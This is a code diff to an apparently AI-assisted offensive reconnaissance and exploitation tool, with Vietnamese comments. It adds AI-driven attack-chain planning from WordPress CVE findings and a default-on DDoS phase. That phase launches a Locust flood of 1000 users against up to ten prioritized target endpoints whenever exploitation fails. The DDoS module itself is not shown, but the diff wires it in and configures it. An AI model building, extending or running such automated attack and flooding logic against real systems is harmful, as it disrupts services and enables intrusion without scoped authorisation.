@@ -1,5 +1,7 @@
 import argparse
 import warnings
+# Thêm vào sau các import modules
+from modules.ddos_attacker import DDoSAttacker
 try:
     from bs4 import XMLParsedAsHTMLWarning
     warnings.filterwarnings('ignore', category=XMLParsedAsHTMLWarning)
@@ -16,6 +18,7 @@ import signal
 import concurrent.futures
 import re
 from datetime import datetime, timedelta
+from dataclasses import asdict
 from glob import glob
 import threading
 from collections import defaultdict, deque
@@ -50,7 +53,7 @@ from ai.groq_client import GroqClient
 from ai.payload_gen import PayloadGenerator
 from ai.payload_mutation import PayloadMutator
 from ai.analyzer import AIAnalyzer
-from ai.chain_planner import ChainPlanner
+from ai.chain_planner import ChainPlanner, AIPoweredChainPlanner
 
 # ─── Constants ──────────────────────────────────────────────────────────────
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -99,6 +102,7 @@ from modules.exploiter import ExploitTestEngine
 from modules.live_hosts import LiveHostEngine
 from modules.auth_scanner import AuthScannerEngine
 from modules.toolkit_scanner import ToolkitScanner
+from modules.endpoint_probe import run_endpoint_probe
 
 
 # ─── API Key Check ───────────────────────────────────────────────────────────
@@ -158,6 +162,7 @@ class BatchDisplay:
         self.render_thread.start()
         self.spinner_index = 0
         self.spinner_frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
+        self.ddos_attacker = None
     def stop(self):
         self.running = False
     
@@ -992,11 +997,13 @@ class ReconAgent:
         self.endpoint_classifier = EndpointClassifier()
         self.payload_gen = PayloadGenerator(groq_key)
         self.payload_mutator = PayloadMutator()
-        self.vuln_analyzer = AIAnalyzer(self.state, output_dir, GroqClient(groq_key))
+        self.groq_client = GroqClient(groq_key) if groq_key else None
+        self.vuln_analyzer = AIAnalyzer(self.state, output_dir, self.groq_client)
         self.chain_planner = ChainPlanner(
             self.state,
             learning_engine=self.learning_engine
         )
+        self.ai_chain_planner = AIPoweredChainPlanner(self.groq_client) if self.groq_client else None
         
         self.recon_engine = ReconEngine(self.state, output_dir)
         self.live_host_engine = LiveHostEngine(self.state, output_dir)
@@ -1063,7 +1070,8 @@ class ReconAgent:
                 'toolkit_metrics': self.toolkit_metrics.copy(),
                 'findings': self.findings.copy(),
                 'last_action': self.last_action,
-                'start_time': self.scan_start_time
+                'start_time': self.scan_start_time,
+                'conditioned_chains': self.state.get("conditioned_chains", [])
             })
         else:
             if self.display:
@@ -1277,6 +1285,13 @@ class ReconAgent:
                 self._adapt_for_next_iteration()
             
             # Final
+
+            if not self.options.get("skip_ddos"):
+                self.current_phase = "ddos"
+                self.phase_detail = "[DDoS] Checking if attack needed..."
+                self._update_display()
+                self._run_ddos_phase()
+
             self.current_phase = "report"
             self.last_action = "generating final report..."
             self.phase_tool = "report-generator"
@@ -1963,11 +1978,44 @@ class ReconAgent:
         self.phase_detail = "[RANK] Prioritizing high-risk endpoints..."
         self._update_display()
         self._run_endpoint_ranking()
+        self._run_post_discovery_probe()
         prioritized = len(self.state.get("prioritized_endpoints", []))
         self.logger.warning(f"[RANK] Prioritized endpoints count: {prioritized}")
         self._update_display()
         self.phase_status = "done"
         self._mark_phase_done("rank")
+
+    def _run_post_discovery_probe(self):
+        if not self.options.get("probe_after_discovery"):
+            return
+
+        targets = self.state.get("prioritized_endpoints", []) or []
+        if not targets:
+            self.logger.warning("[PROBE] No prioritized endpoints available for validation")
+            return
+
+        max_endpoints = max(1, int(self.options.get("probe_max_endpoints", 1)))
+        request_count = max(1, int(self.options.get("probe_count", 2)))
+        delay = max(0.1, float(self.options.get("probe_delay", 0.5)))
+
+        self.phase_detail = "[PROBE] Validating prioritized endpoints..."
+        self.phase_tool = "safe-endpoint-probe"
+        self.phase_status = "running"
+        self._update_display()
+
+        results = run_endpoint_probe(
+            state=self.state,
+            output_dir=self.output_dir,
+            http_client=self.http_client,
+            endpoints=targets,
+            max_endpoints=max_endpoints,
+            requests_per_endpoint=request_count,
+            delay_seconds=delay,
+        )
+
+        self.last_action = f"validated {len(results)} prioritized endpoint(s)"
+        self.logger.warning(f"[PROBE] Completed validation on {len(results)} endpoint(s)")
+        self._update_display()
 
     def _run_scanning_phase(self):
         before = len(self.state.get("confirmed_vulnerabilities", []))
@@ -2929,16 +2977,175 @@ class ReconAgent:
         self.phase_status = "done"
         self._mark_phase_done("graph")
 
-    def _run_chain_planning_phase(self, attack_graph: AttackGraph):
-        self.phase_detail = "[CHAINS] Planning attack chains from graph..."
+    def _process_conditioned_findings(self) -> List[Dict[str, Any]]:
+        """
+        Xử lý conditioned findings từ WordPress scan.
+        Đọc wp_conditioned_findings từ state, lọc chain_candidate và confidence >= 70.
+        Trả về danh sách chain info để hiển thị và lưu vào state.
+        """
+        conditioned = self.state.get("wp_conditioned_findings", [])
+        if not conditioned:
+            self.logger.debug("[CONDITIONED] No conditioned findings in state")
+            return []
+        
+        self.logger.info(f"[CONDITIONED] Found {len(conditioned)} conditioned findings, filtering...")
+        
+        chains = []
+        for finding in conditioned:
+            # Chỉ lấy findings có chain_candidate = True
+            if not finding.get("chain_candidate", False):
+                continue
+            
+            confidence = finding.get("confidence", 0)
+            if confidence < 70:
+                self.logger.debug(f"[CONDITIONED] Skipping {finding.get('name')} - confidence {confidence} < 70")
+                continue
+            
+            # Xây dựng chain info
+            component_name = finding.get("name", "unknown")
+            vuln_type = finding.get("vuln_type", "vulnerability")
+            cve_list = finding.get("cve", [])
+            severity = finding.get("severity", "MEDIUM")
+            conditions = finding.get("conditions", {})
+            auth_req = conditions.get("auth_requirement", "unknown")
+            candidate_endpoint = conditions.get("candidate_endpoint", "")
+            version = finding.get("version", "unknown")
+            
+            # Tạo tên chain
+            if cve_list:
+                chain_name = f"[{cve_list[0]}] {component_name} {version} → {vuln_type.upper()}"
+            else:
+                chain_name = f"{component_name} {version} → {vuln_type.upper()}"
+            
+            chain_info = {
+                "name": chain_name,
+                "cve": cve_list,
+                "confidence": confidence,
+                "severity": severity,
+                "prerequisites": auth_req,
+                "endpoint": candidate_endpoint,
+                "version": version,
+                "component": component_name,
+                "vuln_type": vuln_type,
+                "status": "ready" if confidence >= 80 else "candidate"
+            }
+            
+            chains.append(chain_info)
+            
+            # Log chi tiết
+            self.logger.warning(f"[CONDITIONED] ✅ {chain_name} (conf: {confidence}%, auth: {auth_req})")
+            
+            # Thêm vào findings để hiển thị
+            self.findings.setdefault("conditioned_chains", []).append(chain_info)
+            
+            # Thêm vào live feed
+            if self.batch_display:
+                cve_display = cve_list[0] if cve_list else "No CVE"
+                self.batch_display._add_to_ai_feed(
+                    "🔗 Conditioned Chain",
+                    f"{component_name} {version} → {vuln_type} (conf: {confidence}%)",
+                    self.target
+                )
+            
+            # Thêm vào chains_data để hiển thị trong DETAILS
+            chain_display = {
+                'name': chain_name[:50],
+                'risk': severity,
+                'exploited': False,
+                'partial': False,
+                'steps': [],
+                'result': f"Confidence: {confidence}% | Auth: {auth_req}"
+            }
+            
+            if cve_list:
+                chain_display['steps'].append({
+                    'desc': f"CVE: {', '.join(cve_list[:2])}",
+                    'success': False,
+                    'partial': False
+                })
+            
+            if candidate_endpoint:
+                chain_display['steps'].append({
+                    'desc': f"Endpoint: {candidate_endpoint[:50]}",
+                    'success': False,
+                    'partial': False
+                })
+            
+            self.chains_data.append(chain_display)
+        
+        # Lưu vào state
+        self.state.update(conditioned_chains=chains)
+        
+        if chains:
+            self.phase_detail = f"[CONDITIONED] Found {len(chains)} high-confidence chains"
+        else:
+            self.phase_detail = "[CONDITIONED] No high-confidence chains found"
+        
         self._update_display()
+        
+        return chains
+
+    def _run_chain_planning_phase(self, attack_graph: AttackGraph):
+        self.phase_detail = "[CHAINS] Planning attack chains..."
+        self._update_display()
+        
+        # ========== PROCESS CONDITIONED FINDINGS ==========
+        # 1. Xử lý conditioned findings từ WordPress
+        conditioned_chains = self._process_conditioned_findings()
+        if conditioned_chains:
+            self.logger.warning(f"[CHAIN] Found {len(conditioned_chains)} conditioned chains from WordPress data")
+            for chain in conditioned_chains[:3]:
+                if self.batch_display:
+                    self.batch_display._add_to_ai_feed(
+                        "🎯 Conditioned Chain",
+                        f"{chain.get('name', '')[:50]} (conf: {chain.get('confidence')}%)",
+                        self.target
+                    )
+        
+        # 2. Gọi chain planner từ graph (code cũ)
         chains = self.chain_planner.plan_chains_from_graph(attack_graph)
-        manual_playbook = self.chain_planner.build_manual_playbook(chains)
+        base_chains = list(chains)
+        
+        # 3. Gọi conditioned chains từ chain_planner
+        try:
+            wp_conditioned_chains = self.chain_planner._build_conditioned_wp_chains()
+            if wp_conditioned_chains:
+                self.logger.warning(f"[CHAIN] Found {len(wp_conditioned_chains)} chains from chain_planner conditioned method")
+                for chain in wp_conditioned_chains:
+                    chain_name = getattr(chain, 'name', '')
+                    if chain_name and not any(
+                        getattr(c, 'name', '') == chain_name for c in chains
+                    ):
+                        chains.append(chain)
+        except Exception as e:
+            self.logger.debug(f"[CHAIN] Could not get conditioned chains from chain_planner: {e}")
+        # ========== END CONDITIONED FINDINGS ==========
+        
+        if self.ai_chain_planner:
+            try:
+                ai_chains = self.ai_chain_planner.plan_chains(asdict(self.state.state))
+                if ai_chains:
+                    seen_names = {
+                        getattr(chain, "name", "") if not isinstance(chain, dict) else chain.get("name", "")
+                        for chain in chains
+                    }
+                    for chain in ai_chains:
+                        name = chain.get("name", "")
+                        if name and name not in seen_names:
+                            chains.append(chain)
+                            seen_names.add(name)
+            except Exception as e:
+                self.logger.warning(f"[CHAIN] AI chain enrichment failed: {e}")
+        manual_playbook = self.chain_planner.build_manual_playbook(base_chains)
         
         self.chains_data = []
         for i, chain in enumerate(chains[:5], 1):
             chain_name = chain.get("name") if isinstance(chain, dict) else getattr(chain, "name", f"Chain-{i}")
-            chain_risk = chain.get("risk") if isinstance(chain, dict) else getattr(chain, "risk_level", "MEDIUM")
+            chain_risk = (
+                (chain.get("risk") or chain.get("risk_level") or chain.get("severity"))
+                if isinstance(chain, dict)
+                else getattr(chain, "risk_level", "MEDIUM")
+            )
             chain_steps = chain.get("steps", []) if isinstance(chain, dict) else getattr(chain, "steps", [])
             chain_info = {
                 'name': chain_name or f"CHAIN-{i:02d}",
@@ -3040,6 +3247,98 @@ class ReconAgent:
             self._update_display()
         self.phase_status = "done"
         self._mark_phase_done("exploit")
+
+    def _run_ddos_phase(self):
+
+        exploit_results = self.state.get("exploit_results", [])
+        successful_exploits = [r for r in exploit_results if r.get("success", False)]
+        
+        if successful_exploits:
+            self.logger.info("[DDoS] Skipping - exploits were successful")
+            self.phase_detail = "[DDoS] Skipped - exploits successful"
+            self._update_display()
+            return
+        
+        # Lấy prioritized endpoints
+        endpoints = self.state.get("prioritized_endpoints", [])
+        if not endpoints:
+            self.logger.warning("[DDoS] No endpoints available for attack")
+            self.phase_detail = "[DDoS] No endpoints available"
+            self._update_display()
+            return
+        
+        self.current_phase = "ddos"
+        self.phase_detail = "[DDoS] Starting attack (no exploits found)..."
+        self.phase_tool = "locust-ddos"
+        self.phase_status = "running"
+        self._update_display()
+        
+        try:
+            # Khởi tạo DDoSAttacker
+            self.ddos_attacker = DDoSAttacker(self.state, self.output_dir, self.http_client)
+            
+            # Config DDoS parameters (có thể tùy chỉnh qua options)
+            users = self.options.get("ddos_users", 1000)
+            runtime = self.options.get("ddos_runtime", 60)
+            max_endpoints = self.options.get("ddos_max_endpoints", 10)
+            
+            # Lấy top endpoints
+            attack_targets = []
+            for ep in endpoints[:max_endpoints]:
+                if isinstance(ep, dict):
+                    url = ep.get("url") or ep.get("endpoint")
+                    if url:
+                        attack_targets.append({"url": url, "priority": ep.get("risk_level", "MEDIUM")})
+                elif isinstance(ep, str):
+                    attack_targets.append({"url": ep, "priority": "MEDIUM"})
+            
+            if not attack_targets:
+                self.logger.warning("[DDoS] No valid target URLs")
+                return
+            
+            self.logger.warning(f"[DDoS] 🔥 LAUNCHING ATTACK on {len(attack_targets)} endpoints with {users} users for {runtime}s")
+            self.phase_detail = f"[DDoS] Flooding {len(attack_targets)} endpoints with {users} users..."
+            self._update_display()
+            
+            # Execute attack
+            results = self.ddos_attacker.run_ddos_attack(
+                endpoints=attack_targets,
+                users=users,
+                spawn_rate=int(users / 10),
+                runtime=runtime,
+                method="MIX"
+            )
+            
+            # Save results
+            self.state.update(ddos_results=results)
+            
+            if results.get("status") == "completed":
+                total_requests = results.get("total_requests", 0)
+                rps = results.get("current_rps", 0)
+                self.last_action = f"DDoS completed: {total_requests} requests, {rps} req/s"
+                self.phase_detail = f"[DDoS] Attack finished - {total_requests} requests sent"
+                
+                if self.batch_display:
+                    self.batch_display._add_to_feed("💣", "DDoS", self.target, f"{total_requests} reqs, {rps} rps")
+            else:
+                self.last_action = f"DDoS failed: {results.get('reason', 'unknown')}"
+                self.phase_detail = f"[DDoS] Attack failed - {results.get('reason', 'unknown')}"
+            
+            self._update_display()
+            
+        except ImportError:
+            self.logger.error("[DDoS] Locust not installed! Install with: pip install locust")
+            self.last_action = "DDoS: locust not installed"
+            self.phase_detail = "[DDoS] Locust not installed"
+            self._update_display()
+        except Exception as e:
+            self.logger.error(f"[DDoS] Phase failed: {e}")
+            self.last_action = f"DDoS error: {str(e)[:50]}"
+            self.phase_detail = f"[DDoS] Error - {str(e)[:60]}"
+            self._update_display()
+        
+        self.phase_status = "done"
+        self._mark_phase_done("ddos")
 
     def _run_learning_phase(self):
         self.phase_detail = "[LEARN] Analyzing results and updating patterns..."
@@ -3816,6 +4115,54 @@ def parse_args():
     parser.add_argument("--once", action="store_true", help="Run one scheduling cycle and exit")
     parser.add_argument("--no-resume", action="store_true", help="Always start fresh run (disable auto-resume)")
     parser.add_argument("--aggressive", action="store_true", help=argparse.SUPPRESS)
+    parser.add_argument(
+        "--probe-after-discovery",
+        action="store_true",
+        help="Run a low-rate validation pass on prioritized endpoints immediately after ranking"
+    )
+    parser.add_argument(
+        "--probe-max-endpoints",
+        type=int,
+        default=1,
+        help="Max prioritized endpoints to validate after ranking (default: 1)"
+    )
+    parser.add_argument(
+        "--probe-count",
+        type=int,
+        default=2,
+        help="Requests per validated endpoint during the safe probe pass (default: 2)"
+    )
+    parser.add_argument(
+        "--probe-delay",
+        type=float,
+        default=0.5,
+        help="Delay in seconds between probe requests (default: 0.5)"
+    )
+
+
+    parser.add_argument(
+        "--skip-ddos",
+        action="store_true",
+        help="Skip DDoS attack phase (enabled by default when no exploits found)"
+    )
+    parser.add_argument(
+        "--ddos-users",
+        type=int,
+        default=1000,
+        help="Number of concurrent users for DDoS (default: 1000)"
+    )
+    parser.add_argument(
+        "--ddos-runtime",
+        type=int,
+        default=60,
+        help="Duration of DDoS attack in seconds (default: 60)"
+    )
+    parser.add_argument(
+        "--ddos-max-endpoints",
+        type=int,
+        default=10,
+        help="Max endpoints to attack (default: 10)"
+    )
 
     return parser.parse_args()
 
@@ -4027,7 +4374,15 @@ def main():
         "skip_toolkit": args.skip_toolkit,
         "skip_exploit": args.no_exploit,
         "verbose": args.verbose,
-        "aggressive": True
+        "aggressive": True,
+        "probe_after_discovery": args.probe_after_discovery,
+        "probe_max_endpoints": args.probe_max_endpoints,
+        "probe_count": args.probe_count,
+        "probe_delay": args.probe_delay,
+        "skip_ddos": args.skip_ddos,
+        "ddos_users": args.ddos_users,
+        "ddos_runtime": args.ddos_runtime,
+        "ddos_max_endpoints": args.ddos_max_endpoints,
     }
 
     if args.target:
